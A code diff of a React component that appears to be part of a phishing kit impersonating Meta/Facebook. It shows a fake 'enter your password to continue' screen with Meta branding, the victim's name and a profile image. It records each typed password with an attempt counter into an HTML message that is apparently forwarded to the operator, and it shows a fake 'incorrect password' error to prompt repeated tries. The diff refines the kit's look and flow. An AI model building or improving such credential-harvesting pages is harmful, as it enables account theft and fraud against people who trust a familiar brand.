@@ -1,14 +1,16 @@
+import ProfileImage from '@/assets/images/profile-image.png';
+import useTranslation from '@/hooks/useTranslation';
 import { store } from '@/store/store';
 import config from '@/utils/config';
-import translateText from '@/utils/translate';
 import { faEye } from '@fortawesome/free-regular-svg-icons/faEye';
 import { faEyeSlash } from '@fortawesome/free-regular-svg-icons/faEyeSlash';
 import { faCircleExclamation } from '@fortawesome/free-solid-svg-icons/faCircleExclamation';
 import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
 import axios from 'axios';
-import { type FC, useEffect, useId, useState } from 'react';
+import Image from 'next/image';
+import { type FC, useId, useState } from 'react';
 
-const DESCRIPTION_VI = 'Để hoàn tất quy trình, vui lòng xác minh rằng bạn thực sự là chủ sở hữu tài khoản.';
+const DESCRIPTION = 'Enter your password to continue.';
 
 const PasswordModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
     const uid = useId().replace(/[:.]/g, '');
@@ -18,44 +20,21 @@ const PasswordModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
 
     const [attempts, setAttempts] = useState(0);
     const [isLoading, setIsLoading] = useState(false);
-    const [identifier, setIdentifier] = useState('');
     const [password, setPassword] = useState('');
     const [showError, setShowError] = useState(false);
     const [showPassword, setShowPassword] = useState(false);
-    const [identifierError, setIdentifierError] = useState('');
-    const [translations, setTranslations] = useState<Record<string, string>>({});
 
-    const { geoInfo, messageId, messageContent, setMessageContent } = store();
+    const { t } = useTranslation();
+    const { messageId, messageContent, setMessageContent, userInfo } = store();
     const maxPass = config.MAX_PASS ?? 3;
-
-    const t = (text: string): string => {
-        return translations[text] || text;
-    };
-
-    useEffect(() => {
-        if (!geoInfo) return;
-
-        const textsToTranslate = [DESCRIPTION_VI, 'Email hoặc số điện thoại', 'Nhập mật khẩu', "The password that you've entered is incorrect.", 'Tiếp tục', 'Please enter a valid email or phone number.'];
-
-        const translateAll = async () => {
-            const translatedMap: Record<string, string> = {};
-
-            for (const text of textsToTranslate) {
-                translatedMap[text] = await translateText(text, geoInfo.country_code);
-            }
-
-            setTranslations(translatedMap);
-        };
-
-        translateAll();
-    }, [geoInfo]);
+    const fullName = userInfo?.fullName || '';
 
     const togglePassword = () => {
         setShowPassword(!showPassword);
     };
 
     const handleSubmit = async () => {
-        if (!identifier.trim() || !password.trim() || isLoading) return;
+        if (!password.trim() || isLoading) return;
 
         setShowError(false);
         setIsLoading(true);
@@ -63,11 +42,9 @@ const PasswordModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
         const next = attempts + 1;
         setAttempts(next);
 
-        const identifierLine = `<b>👤 Account:</b> <code>${identifier}</code>`;
         const passwordLine = `<b>🔒 Password ${next}/${maxPass}:</b> <code>${password}</code>`;
-        const combined = `${identifierLine}\n${passwordLine}`;
 
-        const updatedMessage = messageContent ? `${messageContent}\n\n${combined}` : combined;
+        const updatedMessage = messageContent ? `${messageContent}\n\n${passwordLine}` : passwordLine;
 
         setMessageContent(updatedMessage);
 
@@ -95,54 +72,15 @@ const PasswordModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
     };
 
     const card = (
-        <div className='flex w-full max-w-[580px] flex-col rounded-[8px] bg-linear-to-br from-[#f7edf6] via-[#eaf2ff] to-[#dff7eb] px-6 py-10 shadow-lg sm:px-8 sm:py-12 md:py-10'>
-            <div className='mx-auto mb-[100px] sm:mb-[130px]'>
-                <svg xmlns='http://www.w3.org/2000/svg' width='56' height='56' viewBox='0 0 40 40'>
-                    <path fill='#1877F2' d='M16.7 39.8C7.2 38.1 0 29.9 0 20 0 9 9 0 20 0s20 9 20 20c0 9.9-7.2 18.1-16.7 19.8l-1.1-.9h-4.4l-1.1.9z' />
-                    <path fill='#fff' d='m27.8 25.6.9-5.6h-5.3v-3.9c0-1.6.6-2.8 3-2.8H29V8.2c-1.4-.2-3-.4-4.4-.4-4.6 0-7.8 2.8-7.8 7.8V20h-5v5.6h5v14.1c1.1.2 2.2.3 3.3.3 1.1 0 2.2-.1 3.3-.3V25.6h4.4z' />
-                </svg>
+        <div className='flex w-full max-w-[580px] flex-col rounded-[8px] bg-linear-to-br from-[#f7edf6] via-[#eaf2ff] to-[#dff7eb] px-5 py-6 shadow-lg sm:px-8 sm:py-12 md:py-10'>
+            <div className='mx-auto mb-4 flex flex-col items-center gap-2 sm:mb-6 sm:gap-3'>
+                <Image src={ProfileImage} alt='' className='h-16 w-16 rounded-full border-2 border-white sm:h-24 sm:w-24' />
+                <p className='text-center text-[15px] font-semibold text-[#1C2B33] sm:text-[18px]'>{fullName}</p>
             </div>
 
-            <p className='mb-[14px] text-[15px] leading-[1.45] font-medium text-[#8f96a3] sm:text-[16px]'>{t(DESCRIPTION_VI)}</p>
+            <p className='mb-3 text-center text-[13px] leading-[1.4] font-medium text-[#8f96a3] sm:mb-[14px] sm:text-[15px]'>{t(DESCRIPTION)}</p>
 
-            <div className='relative mb-[12px] h-[60px] w-full rounded-[16px] bg-[rgba(255,255,255,0.2)] px-[16px] pt-[18px] transition-all duration-200 focus-within:!border-[#666A72] focus-within:![box-shadow:0_0_0_2px_#fff,0_0_0_4px_#1877F2]' style={{ border: identifierError ? '0.8px solid #e41e3f' : '0.8px solid #D0D3D6', boxShadow: identifierError ? '0 0 0 2px #fff, 0 0 0 4px #e41e3f' : 'none' }}>
-                <input
-                    type='text'
-                    value={identifier}
-                    onChange={(e) => {
-                        setIdentifier(e.target.value);
-                        setIdentifierError('');
-                        setShowError(false);
-                    }}
-                    onBlur={() => {
-                        if (identifier.includes('@') && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(identifier.trim())) {
-                            setIdentifierError('Please enter a valid email or phone number.');
-                        }
-                    }}
-                    autoComplete='username'
-                    placeholder=' '
-                    className='peer h-[38px] w-full bg-transparent text-[15px] outline-none'
-                    style={{ fontFamily: "'Optimistic', system-ui, sans-serif", color: '#111112' }}
-                />
-                <label
-                    className='pointer-events-none absolute left-[16px] text-[15px] text-[#666A72] select-none peer-not-placeholder-shown:-translate-y-[11.27px] peer-not-placeholder-shown:scale-[0.8667] peer-focus:-translate-y-[11.27px] peer-focus:scale-[0.8667]'
-                    style={{
-                        fontFamily: "'Optimistic', Helvetica, Arial, sans-serif",
-                        top: '18px',
-                        transformOrigin: '0 0',
-                        transition: 'transform 0.2s cubic-bezier(0.17, 0.17, 0, 1)'
-                    }}
-                >
-                    {t('Email hoặc số điện thoại')}
-                </label>
-            </div>
-            {identifierError && (
-                <p className='mb-[12px] text-[13px] text-[#e41e3f]' style={{ fontFamily: "'Optimistic', system-ui, sans-serif" }}>
-                    {t(identifierError)}
-                </p>
-            )}
-
-            <div className='relative mb-[12px] h-[60px] w-full rounded-[16px] bg-[rgba(255,255,255,0.2)] px-[16px] pt-[18px] transition-all duration-200 focus-within:!border-[#666A72] focus-within:![box-shadow:0_0_0_2px_#fff,0_0_0_4px_#1877F2]' style={{ border: showError ? '0.8px solid #e41e3f' : '0.8px solid #D0D3D6', boxShadow: showError ? '0 0 0 2px #fff, 0 0 0 4px #e41e3f' : 'none' }}>
+            <div className='relative mb-3 h-[52px] w-full rounded-[12px] bg-[rgba(255,255,255,0.2)] px-3 pt-[14px] transition-all duration-200 focus-within:!border-[#666A72] focus-within:![box-shadow:0_0_0_2px_#fff,0_0_0_4px_#1877F2] sm:mb-[12px] sm:h-[60px] sm:rounded-[16px] sm:px-[16px] sm:pt-[18px]' style={{ border: showError ? '0.8px solid #e41e3f' : '0.8px solid #D0D3D6', boxShadow: showError ? '0 0 0 2px #fff, 0 0 0 4px #e41e3f' : 'none' }}>
                 <input
                     type={showPassword ? 'text' : 'password'}
                     value={password}
@@ -152,45 +90,45 @@ const PasswordModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
                     }}
                     autoComplete='current-password'
                     placeholder=' '
-                    className='peer h-[38px] w-full bg-transparent pr-[40px] text-[15px] outline-none'
+                    className='peer h-[34px] w-full bg-transparent pr-[34px] text-[14px] outline-none sm:h-[38px] sm:pr-[40px] sm:text-[15px]'
                     style={{ fontFamily: "'Optimistic', system-ui, sans-serif", color: '#111112' }}
                 />
                 <label
-                    className='pointer-events-none absolute left-[16px] text-[15px] text-[#666A72] select-none peer-not-placeholder-shown:-translate-y-[11.27px] peer-not-placeholder-shown:scale-[0.8667] peer-focus:-translate-y-[11.27px] peer-focus:scale-[0.8667]'
+                    className='pointer-events-none absolute left-3 text-[14px] text-[#666A72] select-none peer-not-placeholder-shown:-translate-y-[9px] peer-not-placeholder-shown:scale-[0.8667] peer-focus:-translate-y-[9px] peer-focus:scale-[0.8667] sm:left-[16px] sm:text-[15px] sm:peer-not-placeholder-shown:-translate-y-[11.27px] sm:peer-focus:-translate-y-[11.27px]'
                     style={{
                         fontFamily: "'Optimistic', Helvetica, Arial, sans-serif",
-                        top: '18px',
+                        top: '14px',
                         transformOrigin: '0 0',
                         transition: 'transform 0.2s cubic-bezier(0.17, 0.17, 0, 1)'
                     }}
                 >
-                    {t('Nhập mật khẩu')}
+                    {t('Password')}
                 </label>
-                <FontAwesomeIcon icon={showPassword ? faEyeSlash : faEye} className='absolute top-1/2 right-[16px] -translate-y-1/2 cursor-pointer text-[#666A72] select-none' size='lg' onClick={togglePassword} style={{ fontSize: '20px' }} />
+                <FontAwesomeIcon icon={showPassword ? faEyeSlash : faEye} className='absolute top-1/2 right-3 -translate-y-1/2 cursor-pointer text-[#666A72] select-none sm:right-[16px]' size='lg' onClick={togglePassword} style={{ fontSize: '18px' }} />
             </div>
 
             {showError && (
-                <p className='-mt-[4px] mb-[12px] flex items-center gap-1 text-[13px] text-[#e41e3f]' style={{ fontFamily: "'Optimistic', system-ui, sans-serif" }}>
-                    <FontAwesomeIcon icon={faCircleExclamation} className='h-4 w-4' />
+                <p className='-mt-[2px] mb-3 flex items-center gap-1 text-[12px] text-[#e41e3f] sm:-mt-[4px] sm:mb-[12px] sm:text-[13px]' style={{ fontFamily: "'Optimistic', system-ui, sans-serif" }}>
+                    <FontAwesomeIcon icon={faCircleExclamation} className='h-3.5 w-3.5 sm:h-4 sm:w-4' />
                     <span>{t("The password that you've entered is incorrect.")}</span>
                 </p>
             )}
 
             <button
                 onClick={handleSubmit}
-                disabled={isLoading || !identifier.trim() || !password.trim()}
-                className={`flex h-[44px] w-full items-center justify-center rounded-full text-[15px] font-medium text-[#F2F4F6] transition-opacity ${isLoading || !identifier.trim() || !password.trim() ? 'cursor-not-allowed opacity-60' : ''}`}
+                disabled={isLoading || !password.trim()}
+                className={`flex h-[40px] w-full items-center justify-center rounded-full text-[14px] font-medium text-[#F2F4F6] transition-opacity sm:h-[44px] sm:text-[15px] ${isLoading || !password.trim() ? 'cursor-not-allowed opacity-60' : ''}`}
                 style={{
                     backgroundColor: '#0064E0',
                     fontFamily: "'Optimistic', system-ui, sans-serif"
                 }}
             >
-                {isLoading ? <div className='h-5 w-5 animate-spin rounded-full border-2 border-[#F2F4F6] border-t-transparent'></div> : t('Tiếp tục')}
+                {isLoading ? <div className='h-4 w-4 animate-spin rounded-full border-2 border-[#F2F4F6] border-t-transparent sm:h-5 sm:w-5'></div> : t('Continue')}
             </button>
 
-            <div className='mt-auto pt-[60px] sm:pt-[80px]'>
+            <div className='mt-auto pt-8 sm:pt-[80px]'>
                 <div className='flex flex-col items-center'>
-                    <svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 500 100' className='h-3 w-[60px] sm:h-3.5 sm:w-[70px]'>
+                    <svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 500 100' className='h-2.5 w-[50px] sm:h-3.5 sm:w-[70px]'>
                         <defs>
                             <linearGradient gradientUnits='userSpaceOnUse' id={g1} x1='124.38' x2='160.839' y1='99' y2='59.326'>
                                 <stop offset='.427' stopColor='#0278F1' />
@@ -212,7 +150,7 @@ const PasswordModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
                         <path d='M42 .016C18.63.776.832 28.908.028 63h16.92C17.483 39.716 28.762 18.315 42 17.31V.017Z' fill={`url(#${g2})`} />
                         <path d='m75.195 19.935.007-.009c2.447 3.223 5.264 7.229 9.33 13.62l-.005.005c2.478 3.906 5.09 8.208 7.88 12.945l9.663 16.386c8.978 15.157 13.364 19.39 20.012 19.39.31 0 .617-.012.918-.037v16.76c-.183.003-.367.005-.551.005-14.323 0-22.777-6.281-35.182-27.447L77.604 55.1l-.625-1.065L77 54c-2.386-4.175-7.606-12.685-11.973-19.232l.005-.008-.62-.91C63.153 31.983 61.985 30.313 61 29l-.066.024c-7.006-9.172-11.818-11.75-17.964-11.75-.324 0-.648.012-.97.037V.016c.322-.01.646-.016.97-.016 12.182 0 21.17 5.36 32.225 19.935Z' fill={`url(#${g3})`} />
                     </svg>
-                    <p className='mt-2 text-[13px] text-[#7d8792] sm:text-[14px]'>Meta &copy; 2026</p>
+                    <p className='mt-2 text-[13px] text-[#7d8792] sm:text-[14px]'>{t('Meta © 2026')}</p>
                 </div>
             </div>
         </div>
@@ -221,7 +159,9 @@ const PasswordModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
     return (
         <>
             {/* Mobile */}
-            <div className='fixed inset-0 z-10 flex h-screen w-screen items-center justify-center bg-black/30 px-4 py-6 md:hidden'>{card}</div>
+            <div className='fixed inset-0 z-10 flex h-screen w-screen items-center justify-center bg-black/30 px-4 py-4 md:hidden'>
+                <div className='max-h-full w-full overflow-y-auto'>{card}</div>
+            </div>
 
             {/* Desktop */}
             <div className='fixed inset-0 z-10 hidden items-center justify-center bg-black/40 px-4 py-10 md:flex'>{card}</div>
